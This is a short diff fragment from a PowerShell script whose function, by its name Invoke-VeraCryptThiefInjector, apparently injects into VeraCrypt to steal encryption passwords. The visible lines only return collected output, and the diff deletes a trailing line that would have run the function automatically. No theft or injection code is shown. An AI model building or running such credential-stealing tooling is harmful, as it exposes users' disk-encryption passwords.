@@ -16,4 +16,3 @@ function Invoke-VeraCryptThiefInjector
     $resUlTs = $sTRInGWRiter.TOSTring()
     $rESuLTs
 }
-Invoke-VeraCryptThiefInjector
